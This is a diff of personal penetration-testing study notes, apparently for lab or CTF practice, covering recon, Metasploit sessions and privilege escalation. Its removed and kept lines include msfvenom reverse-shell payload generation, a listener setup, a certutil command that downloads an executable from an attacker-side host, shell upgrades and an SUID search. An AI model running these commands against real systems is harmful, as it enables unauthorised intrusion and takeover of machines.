@@ -5,17 +5,11 @@ Recon has two parts
 1. Passive
 2. Active (Scanning and Enumeration)
 
-In this stage we also have to do the following
-	1. Target Validation
-		WHOIS, nslookup, dnsrecon
-	2. Finding subdomains
-		Google fu, dig, nmap, sublist3r, bluto, crt.sh
-	3. Fingureprinting
-		nmap, wappalyzer, whatweb, builtwhith, netcat
-	4. Data breaches
-		Havelbeenpwned, breach-parse, weleakinfo
-		
-		Note: If you find a database machine with authentication, try the default creds from the internet.
+Use nmap to scan the targets
+Note the discovered IPs
+Use nikto on web servers
+Use Dirb
+
 
 
 
@@ -38,7 +32,6 @@ NOTE: If you hit a deadend, search the version exploit on google.
 ### 3 Gaining Access (Exploitation)
 NOTE: ALWAYS ALWAYS SET LHOST TO YOUR IP
 NOTE: Always use auxerally scanners to confirm the vulnerability exists before sending an exploit.
-NOTE: TO GET BACK TO METERPRETER USE sessions -i session_number
 Learn how to select session and background session
 getuid
 sysinfo
@@ -64,11 +57,6 @@ migrate _processnumber_ (Windows)
 nikto -h URL
 curl http://url
 
-To find out if we can run sudo without password
-sudo -l
-
-To list all the file, folders and sub-folders from the root directory
-sudo ls ../../../*
 
 
 
@@ -114,38 +102,13 @@ asm,asmx,asp,aspx,bak
 Apache
 php,zip,rar,bak
 
-### MSFVENOM
 
-### SEARCH MSFVENOM PAYLOADS
-msfvenom -l payloads |grep "cmd/unix"|awk '{print $1}'
-
-sEARCH msfvenom cheat sheet on google
-
- use exploit/multi/handler (Exploit handler is a listner) 
- Now you have to set a payload for the exploit handler
-
-NOTE: Use the same tcp_reverse shell as used in the msfvenom
-set payload ......tcp_reverse
-
-msfvenom -p java/shell_reverse_tcp lhost=172.16.64.12 lport=4321 -f war -o pwn.war
-
--p flag specifies the payload
--f flag specifies the desired format 
--o flag is the name of the output file
-
-### MSF LISTENER
- use exploit/multi/handler set payload linux/x64/meterpreter_reverse_tcp set lhost 192.168.181.132 set lport 4321 run
-
-
-nc -lvnp 4444
-
-### WAR FILE
-https://github.com/BustedSec/webshell/blob/master/webshell.war
-
-
-### HTTP Server (Linux)
+### HTTP Server (Linux)kali
 python -m SimpleHTTPServer 80
 You hosted a file on linux using the above command then you can get the file in windows by the below command.
+
+For PYTHON 3
+python3 -m http.server
   
 ### Transporting file to Windows
 certutil -urlcache -f http://10.10.14.24/sh.exe c:\user\desktop
@@ -160,6 +123,20 @@ nc -nvlp 1234
 LinEnum.sh
 Linuxprivchecker.py
 
+### Convert a nc to bash shell
+python -c 'import pty; pty.spawn("/bin/bash")'
+
+find / -user root -perm /4000 2> /root/Desktop/suid.txt
+
+
+
+### find files in bash shell
+find / -type f -name user.txt
+
+
+
+### 
+https://gtfobins.github.io/gtfobins/python/
 ### Exploit 
 Local (Use local when you have already gained access to the system.)
 exploits/linux/local/xyz.php
